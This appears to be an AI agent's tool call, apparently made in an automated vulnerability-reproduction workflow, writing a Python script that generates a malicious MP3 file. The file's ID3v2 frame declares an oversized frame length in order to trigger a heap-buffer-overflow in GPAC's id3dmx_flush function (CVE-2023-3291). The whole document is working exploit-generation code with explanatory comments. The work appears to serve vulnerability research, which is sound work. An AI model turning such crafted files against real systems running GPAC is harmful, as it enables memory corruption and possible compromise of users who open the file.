  write_file with args {'file_path': '/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2023-3291/round2/gen_testcase_round2.py', 'content': '#!/usr/bin/env python3\n"""\nGenerate a malicious MP3 file with ID3v2 tag to trigger heap-buffer-overflow\nin GPAC\'s id3dmx_flush function.\n\nKey insight from round 1: ctx->opid must be non-NULL for id3dmx_flush to be called.\nThis requires having a valid MP3 frame BEFORE the ID3 tag to initialize the output PID.\n\nStrategy: Create a minimal valid MP3 file with:\n1. A valid MP3 frame header and minimal frame data to initialize ctx->opid\n2. Followed by an ID3v2 tag with a huge frame size to trigger allocation failure\n"""\n\nimport struct\n\noutput_path = "/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2023-3291/round2/testcase-round2.mp3"\n\ndef synchsafe_encode(value):\n    """Encode a 32-bit value as synchsafe integer (28 bits, 7 bits per byte)"""\n    return struct.pack(\'>4B\',\n                       (value >> 21) & 0x7F,\n                       (value >> 14) & 0x7F,\n                       (value >> 7) & 0x7F,\n                       value & 0x7F)\n\ndef create_mp3_frame_header(mpeg_version=3, layer=1, bitrate_index=9, sample_rate_index=0, padding=0):\n    """\n    Create a valid MP3 frame header (4 bytes)\n    mpeg_version: 3=MPEG1, 2=MPEG2, 0=MPEG2.5\n    layer: 1=Layer3, 2=Layer2, 3=Layer1\n    bitrate_index: see MP3 bitrate table (9 = 128kbps for MPEG1 Layer3)\n    sample_rate_index: 0=44100Hz, 1=48000Hz, 2=32000Hz\n    """\n    # Frame sync (11 bits set)\n    byte0 = 0xFF\n    byte1 = 0xE0  # 111 for sync\n    \n    # MPEG version (2 bits)\n    byte1 |= (mpeg_version & 0x3) << 3\n    \n    # Layer (2 bits)\n    byte1 |= (layer & 0x3) << 1\n    \n    # Protection bit (1 bit) - 1 = no CRC\n    byte1 |= 1\n    \n    # Bitrate index (4 bits)\n    byte2 = (bitrate_index & 0xF) << 4\n    \n    # Sample rate index (2 bits)\n    byte2 |= (sample_rate_index & 0x3) << 2\n    \n    # Padding (1 bit)\n    byte2 |= (padding & 0x1) << 1\n    \n    # Private bit (1 bit)\n    byte2 |= 0\n    \n    # Channel mode (2 bits) - 00 = stereo\n    byte3 = 0x00 << 6\n    \n    # Mode extension, copyright, original, emphasis\n    byte3 |= 0x00\n    \n    return bytes([byte0, byte1, byte2, byte3])\n\nwith open(output_path, \'wb\') as f:\n    # Step 1: Write a valid MP3 frame to initialize ctx->opid\n    # MPEG1 Layer3, 128kbps, 44.1kHz\n    mp3_header = create_mp3_frame_header(mpeg_version=3, layer=1, bitrate_index=9, sample_rate_index=0)\n    f.write(mp3_header)\n    \n    # Frame size for MPEG1 Layer3 at 128kbps, 44.1kHz = 417 bytes\n    # Formula: frameSize = (144 * bitrate / sampleRate) + padding\n    # = (144 * 128000 / 44100) = 417 bytes\n    frame_data_size = 417 - 4  # minus header\n    f.write(b\'\\x00\' * frame_data_size)\n    \n    # Step 2: Write another MP3 frame to ensure proper sync\n    f.write(mp3_header)\n    f.write(b\'\\x00\' * frame_data_size)\n    \n    # Step 3: Now write the malicious ID3v2 tag\n    f.write(b\'ID3\')           # ID3v2 magic\n    f.write(b\'\\x03\\x00\')      # Version: ID3v2.3.0\n    f.write(b\'\\x00\')          # Flags: no flags set\n    \n    # Tag size: needs to be large enough to contain our malicious frame\n    # Set it to a reasonable value that can contain the frame header + huge fsize\n    tag_size = 0x1000  # 4096 bytes for the tag\n    f.write(synchsafe_encode(tag_size))\n    \n    # Write an ID3v2 frame with a huge size to trigger allocation failure\n    # Frame ID: "TIT2" (Title) - this is a text frame starting with \'T\'\n    f.write(b\'TIT2\')\n    \n    # Frame size: Use a very large value to trigger allocation failure\n    # Use 0x0FFFFFFF (268,435,455 bytes) - max synchsafe value\n    huge_fsize = 0x0FFFFFFF\n    f.write(synchsafe_encode(huge_fsize))\n    \n    # Frame flags (2 bytes)\n    f.write(b\'\\x00\\x00\')\n    \n    # Frame data: Just write a few bytes\n    # Text encoding byte (0x00 = ISO-8859-1)\n    f.write(b\'\\x00\')\n    # Some dummy text\n    f.write(b\'A\' * 100)\n    \n    # Pad to match the declared tag_size\n    current_size = 10 + 2 + 1 + 100  # frame header + flags + encoding + text\n    padding_needed = tag_size - current_size\n    if padding_needed > 0:\n        f.write(b\'\\x00\' * padding_needed)\n\nprint(f"Generated malicious MP3 file at: {output_path}")\nprint(f"File structure:")\nprint(f"  1. Valid MP3 frame (417 bytes) to initialize ctx->opid")\nprint(f"  2. Second MP3 frame (417 bytes) for sync validation")\nprint(f"  3. ID3v2 tag with huge frame size: 0x{huge_fsize:X} ({huge_fsize} bytes)")\nprint(f"This should trigger allocation failure and heap-buffer-overflow in id3dmx_flush")\n'}
